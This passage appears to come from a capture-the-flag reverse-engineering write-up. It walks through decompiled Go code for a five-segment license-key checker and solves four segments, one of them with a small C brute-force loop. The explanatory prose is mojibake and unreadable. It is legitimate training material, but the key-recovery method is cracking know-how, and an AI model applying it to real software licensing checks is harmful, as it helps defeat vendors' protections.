<span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v26; <span class="comment">// r11</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  uint8 v28; <span class="comment">// si</span></span><br><span class="line">  uint8 v29; <span class="comment">// si</span></span><br><span class="line">  <span class="type">bool</span> elem; <span class="comment">// [rsp+1h] [rbp-31h] BYREF</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+2h] [rbp-30h]</span></span><br><span class="line">  uintptr v32; <span class="comment">// [rsp+Ah] [rbp-28h]</span></span><br><span class="line">  __int64 *<span class="built_in">array</span>; <span class="comment">// [rsp+12h] [rbp-20h]</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+1Ah] [rbp-18h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+22h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+32h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="built_in">string</span> v37; <span class="comment">// 0:rcx.8,8:rdi.8</span></span><br><span class="line">  _slice_string v38; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v1 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x495FC5</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  v37.str = &amp;runtime_gcbits__ptr_;</span><br><span class="line">  v37.len = <span class="number">1LL</span>;</span><br><span class="line">  v38 = strings_genSplit(key, v37, <span class="number">0LL</span>, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v38.len != <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">array</span> = v38.<span class="built_in">array</span>;</span><br><span class="line">    c = runtime_makechan(&amp;RTYPE_chan_bool_0, <span class="number">5LL</span>);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">1</span>];</span><br><span class="line">    v35 = *<span class="built_in">array</span>;</span><br><span class="line">    v7 = runtime_newobject(&amp;stru_4A7560);</span><br><span class="line">    v7-&gt;fn = main_checkKey_func1;</span><br><span class="line">    v7[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v8 = v35;</span><br><span class="line">      *v10 = v35;</span><br><span class="line">      v9 = c;</span><br><span class="line">      v10[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v35;</span><br><span class="line">      v9 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v7[<span class="number">1</span>].fn = v8;</span><br><span class="line">    v7[<span class="number">3</span>].fn = v9;</span><br><span class="line">    runtime_newproc(v7);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">3</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">2</span>];</span><br><span class="line">    v11 = runtime_newobject(&amp;stru_4A7600);</span><br><span class="line">    v11-&gt;fn = main_checkKey_func2;</span><br><span class="line">    v11[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v12 = v35;</span><br><span class="line">      *v14 = v35;</span><br><span class="line">      v13 = c;</span><br><span class="line">      v14[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v35;</span><br><span class="line">      v13 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v11[<span class="number">1</span>].fn = v12;</span><br><span class="line">    v11[<span class="number">3</span>].fn = v13;</span><br><span class="line">    runtime_newproc(v11);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">5</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">4</span>];</span><br><span class="line">    v15 = runtime_newobject(&amp;stru_4A76A0);</span><br><span class="line">    v15-&gt;fn = main_checkKey_func3;</span><br><span class="line">    v15[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v16 = v35;</span><br><span class="line">      *v18 = v35;</span><br><span class="line">      v17 = c;</span><br><span class="line">      v18[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v35;</span><br><span class="line">      v17 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v15[<span class="number">1</span>].fn = v16;</span><br><span class="line">    v15[<span class="number">3</span>].fn = v17;</span><br><span class="line">    runtime_newproc(v15);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">7</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">6</span>];</span><br><span class="line">    v19 = runtime_newobject(&amp;stru_4A7740);</span><br><span class="line">    v19-&gt;fn = main_checkKey_func4;</span><br><span class="line">    v19[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v20 = v35;</span><br><span class="line">      *v22 = v35;</span><br><span class="line">      v21 = c;</span><br><span class="line">      v22[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v20 = v35;</span><br><span class="line">      v21 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v19[<span class="number">1</span>].fn = v20;</span><br><span class="line">    v19[<span class="number">3</span>].fn = v21;</span><br><span class="line">    runtime_newproc(v19);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">9</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">8</span>];</span><br><span class="line">    v23 = runtime_newobject(&amp;stru_4A77E0);</span><br><span class="line">    v23-&gt;fn = main_checkKey_func5;</span><br><span class="line">    v23[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v24 = v35;</span><br><span class="line">      *v26 = v35;</span><br><span class="line">      v25 = c;</span><br><span class="line">      v26[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v24 = v35;</span><br><span class="line">      v25 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v23[<span class="number">1</span>].fn = v24;</span><br><span class="line">    v23[<span class="number">3</span>].fn = v25;</span><br><span class="line">    runtime_newproc(v23);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">5</span>; i = v31 + <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v31 = i;</span><br><span class="line">      elem = <span class="number">0</span>;</span><br><span class="line">      runtime_chanrecv1(c, &amp;elem);</span><br><span class="line">      <span class="keyword">if</span> ( !elem )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v2;</span><br><span class="line">    v5 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v38.<span class="built_in">array</span>[v5].len == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0LL</span>; ; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( j &gt;= <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = v4 + <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        v28 = v38.<span class="built_in">array</span>[v5].str[j];</span><br><span class="line">        elem = v28 &lt; <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v28 &gt;= <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">            runtime_panicIndex();</span><br><span class="line">          elem = v38.<span class="built_in">array</span>[v5].str[j] &gt; <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( elem )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">            runtime_panicIndex();</span><br><span class="line">          v29 = v38.<span class="built_in">array</span>[v5].str[j];</span><br><span class="line">          elem = v29 &lt; <span class="number">0x30</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( v29 &gt;= <span class="number">0x30</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">              runtime_panicIndex();</span><br><span class="line">            elem = v38.<span class="built_in">array</span>[v5].str[j] &gt; <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( elem )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•´ä½“é€»è¾‘æ˜¯å…ˆæ£€æµ‹keyçš„æ ¼å¼æ˜¯å¦æ˜¯<code>?????-?????-?????-?????-?????</code> ç„¶åæ£€æµ‹<code>?</code>çš„èŒƒå›´æ˜¯å¦ä¸º<code>[A-Z0-9]</code> å¦‚æœæ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶å°±å¯åŠ¨5ä¸ªçº¿ç¨‹åˆ†åˆ«æ£€æµ‹5æ®µkey</p>
<p>çº¿ç¨‹å‡½æ•°1:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Monday</span></span><br><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Monday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> cap; <span class="comment">// rdi</span></span><br><span class="line">  <span class="built_in">string</span> v5; <span class="comment">// kr00_16</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> elem[<span class="number">33</span>]; <span class="comment">// [rsp+1h] [rbp-31h] BYREF</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+22h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+32h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="built_in">string</span> v10; <span class="comment">// 0:rbx.8,8:rcx.8</span></span><br><span class="line">  _slice_uint8 v11; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8 OVERLAPPED</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x49552D</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  c = check;</span><br><span class="line">  len = key.len;</span><br><span class="line">  v10.str = key.str;</span><br><span class="line">  v10.len = len;</span><br><span class="line">  v11 = runtime_stringtoslicebyte(&amp;elem[<span class="number">1</span>], v10);</span><br><span class="line">  cap = v11.cap;</span><br><span class="line">  v11.cap = v11.len;</span><br><span class="line">  v11.len = v11.<span class="built_in">array</span>;</span><br><span class="line">  v5 = encoding_base64__ptr_Encoding_EncodeToString(encoding_base64_StdEncoding, *&amp;v11.len);</span><br><span class="line">  v6 = v5.len == <span class="number">8</span> &amp;&amp; *v5.str == <span class="string">&#x27;=klUSFET&#x27;</span>;</span><br><span class="line">  elem[<span class="number">0</span>] = v6;</span><br><span class="line">  runtime_chansend1(c, elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¿¡é“<code>check</code>å‘é€æ£€æµ‹æ˜¯å¦é€šè¿‡çš„ä¿¡å·<code>elem</code> ç®€å•çš„base64ç¼–ç  æ±‚å‡ºæ¥çš„å­—èŠ‚ä¸²æ˜¯å°ç«¯åº æ‰€ä»¥è¦é€†è½¬ä¸€ä¸‹ç¼–ç  å¾—åˆ°ç¬¬ä¸€ä¸ªç‰‡æ®µ<code>LARRY</code></p>
<p>çº¿ç¨‹å‡½æ•°2:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Tuesday</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Tuesday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">  uint8 v6; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> elem[<span class="number">9</span>]; <span class="comment">// [rsp+1h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+Ah] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x49560D</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key.len &lt;= v3 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    v6 = key.str[v3];</span><br><span class="line">    elem[<span class="number">0</span>] = v6 &lt; <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">      elem[<span class="number">0</span>] = key.str[v3] &gt; <span class="number">0x39</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( elem[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_chansend1(check, &amp;runtime_egcbss);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = (key.str[v3++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    v4 += v5;</span><br><span class="line">  &#125;</span><br><span class="line">  elem[<span class="number">0</span>] = v4 == <span class="number">35</span>;</span><br><span class="line">  runtime_chansend1(check, elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ£€æµ‹æ¯ä¸€ä½æ˜¯å¦éƒ½æ˜¯æ•°å­—å­—ç¬¦ ç„¶åå°†å¯¹åº”çš„æ•°å­—æ±‚å’Œç»“æœéœ€è¦ä¸º35 ç›´æ¥<code>77777</code></p>
<p>çº¿ç¨‹å‡½æ•°3:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Wednesday</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Wednesday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  __int128 v3; <span class="comment">// xmm15</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 len; <span class="comment">// rax</span></span><br><span class="line">  uint8 *v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// si</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+1h] [rbp-A9h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+2h] [rbp-A8h]</span></span><br><span class="line">  __int128 v11[<span class="number">2</span>]; <span class="comment">// [rsp+Ah] [rbp-A0h] BYREF</span></span><br><span class="line">  runtime_tmpBuf v12; <span class="comment">// [rsp+2Ah] [rbp-80h] BYREF</span></span><br><span class="line">  runtime_tmpBuf buf; <span class="comment">// [rsp+4Ah] [rbp-60h] BYREF</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+6Ah] [rbp-40h]</span></span><br><span class="line">  runtime_hmap h; <span class="comment">// [rsp+72h] [rbp-38h] BYREF</span></span><br><span class="line">  uint8 *keya; <span class="comment">// [rsp+B2h] [rbp+8h]</span></span><br><span class="line">  <span class="built_in">string</span> v17; <span class="comment">// 0:rax.8,8:rbx.8</span></span><br><span class="line">  <span class="built_in">string</span> v18; <span class="comment">// 0:rbx.8,8:rcx.8</span></span><br><span class="line">  _slice_uint8 v19; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;buf[<span class="number">24</span>] &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x49582D</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  keya = key.str;</span><br><span class="line">  c = check;</span><br><span class="line">  *&amp;h.count = v3;</span><br><span class="line">  h.oldbuckets = *(&amp;v3 + <span class="number">1</span>);</span><br><span class="line">  *&amp;h.nevacuate = v3;</span><br><span class="line">  v11[<span class="number">0</span>] = v3;</span><br><span class="line">  v11[<span class="number">1</span>] = v3;</span><br><span class="line">  h.buckets = v11;</span><br><span class="line">  h.hash0 = runtime_fastrand();</span><br><span class="line">  len = key.len;</span><br><span class="line">  v5 = keya;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( len &lt;= v6 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    v7 = v5[v6];</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; <span class="string">&#x27;A&#x27;</span> || v7 &gt; <span class="string">&#x27;Z&#x27;</span> || (v10 = v6, v9 = v7, *runtime_mapaccess1(&amp;RTYPE_map_uint8_bool_0, &amp;h, &amp;v9)) )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_chansend1(c, &amp;runtime_egcbss);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = keya[v10];</span><br><span class="line">    *runtime_mapassign(&amp;RTYPE_map_uint8_bool_0, &amp;h, &amp;v9) = <span class="number">1</span>;</span><br><span class="line">    v6 = v10 + <span class="number">1</span>;</span><br><span class="line">    len = key.len;</span><br><span class="line">    v5 = keya;</span><br><span class="line">  &#125;</span><br><span class="line">  v18.str = v5;</span><br><span class="line">  v18.len = len;</span><br><span class="line">  v19 = runtime_stringtoslicebyte(buf, v18);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v19.len &lt;= i )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    v19.<span class="built_in">array</span>[i] ^= <span class="number">0x60</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = runtime_slicebytetostring(v12, v19.<span class="built_in">array</span>, v19.len);</span><br><span class="line">  main_Tuesday(v17, c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ£€æµ‹keyæ˜¯å¦å…¨éƒ¨éƒ½æ˜¯å¤§å†™å­—æ¯ åœ¨<code>runtime_hmap h</code>ä¸ºæ¯ä¸ªå­—æ¯å»ºç«‹ä¸€ä¸ªæ˜ å°„ å¦‚æœæ£€æµ‹åˆ°å½“å‰å­—æ¯åœ¨mapä¸­å·²ç»æ˜¯å­˜åœ¨çš„keyå°±é€€å‡º é€šè¿‡è¿™å±‚æ£€æµ‹åå°†æ¯ä¸ªå­—æ¯å¼‚æˆ–0x60ç„¶åè°ƒç”¨çº¿ç¨‹å‡½æ•°2 å› ä¸ºä¸èƒ½ç”¨é‡å¤çš„å­—æ¯ æ‰€ä»¥è¿™æ®µkeyå¯ä»¥ä¸º<code>UVWXY</code></p>
<p>çº¿ç¨‹å‡½æ•°4:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Thursday</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Thursday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  __int64 v8; <span class="comment">// r8</span></span><br><span class="line">  __int64 v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> elem[<span class="number">33</span>]; <span class="comment">// [rsp+1h] [rbp-31h] BYREF</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+22h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+32h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="built_in">string</span> v14; <span class="comment">// 0:rbx.8,8:rcx.8</span></span><br><span class="line">  _slice_uint8 v15; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x495929</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  c = check;</span><br><span class="line">  len = key.len;</span><br><span class="line">  v14.str = key.str;</span><br><span class="line">  v14.len = len;</span><br><span class="line">  v15 = runtime_stringtoslicebyte(&amp;elem[<span class="number">1</span>], v14);</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15.len &lt;= v4 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">for</span> ( i = v15.<span class="built_in">array</span>[v4]; i; i = v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v5-- + <span class="number">1</span>;</span><br><span class="line">      v9 = v6-- + <span class="number">1</span>;</span><br><span class="line">      v10 = i;</span><br><span class="line">      <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v5 = v8;</span><br><span class="line">      <span class="keyword">if</span> ( (i &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">        v6 = v9;</span><br><span class="line">      LOBYTE(v10) = i &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  elem[<span class="number">0</span>] = v5 == <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">5</span> )</span><br><span class="line">    elem[<span class="number">0</span>] = v6 == <span class="number">3</span>;</span><br><span class="line">  runtime_chansend1(c, elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æ¯ä¸ªå­—ç¬¦çš„æœ‰æ•ˆä½å¯¹ä¸¤ä¸ªè®¡æ•°å™¨è¿›è¡Œæ“ä½œ è¦æ±‚æœ€åè¿™ä¸¤ä¸ªè®¡æ•°å™¨åˆ°è¾¾ä¸€å®šçš„æ•°å€¼ ç®€å•åˆ†æä¸€ä¸‹å¯ä»¥çŸ¥é“å¦‚æœå­—ç¬¦åœ¨A-ZèŒƒå›´å†…ä¸å¯é€†è¾¾åˆ°è¿™ç§ç»“æœ ç›´æ¥ç”¨æ•°å­—å­—ç¬¦çˆ†ç ´:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> a = <span class="string">&#x27;1&#x27;</span>; a &lt;= <span class="string">&#x27;9&#x27;</span>; a++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> b = <span class="string">&#x27;1&#x27;</span>; b &lt;= <span class="string">&#x27;9&#x27;</span>; b++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> c = <span class="string">&#x27;1&#x27;</span>; c &lt;= <span class="string">&#x27;9&#x27;</span>; c++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> d = <span class="string">&#x27;1&#x27;</span>; d &lt;= <span class="string">&#x27;9&#x27;</span>; d++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> e = <span class="string">&#x27;1&#x27;</span>; e &lt;= <span class="string">&#x27;9&#x27;</span>; e++)&#123;</span><br><span class="line">                        <span class="type">char</span> table[<span class="number">5</span>] = &#123;a, b, c, d, e&#125;;</span><br><span class="line">                        <span class="type">int</span> v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v7 = <span class="number">0</span>, v8 = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">                            <span class="keyword">while</span>(table[i])&#123;</span><br><span class="line">                                v10 = v7-- + <span class="number">1</span>;</span><br><span class="line">                                v11 = v8-- + <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">if</span>(table[i] &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                                    v7 = v10;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span>(table[i] &amp; <span class="number">2</span>)&#123;</span><br><span class="line">                                    v8 = v11;</span><br><span class="line">                                &#125;</span><br><span class="line">                                table[i] &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(v7 == <span class="number">5</span> &amp;&amp; v8 == <span class="number">3</span>)&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c%c %d %d\n&quot;</span>, a, b, c, d, e, v7, v8);</span><br><span class="line">                            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 12277 5 3</span></span><br></pre></td></tr></table></figure>

<p>çº¿ç¨‹å‡½æ•°5:</p>
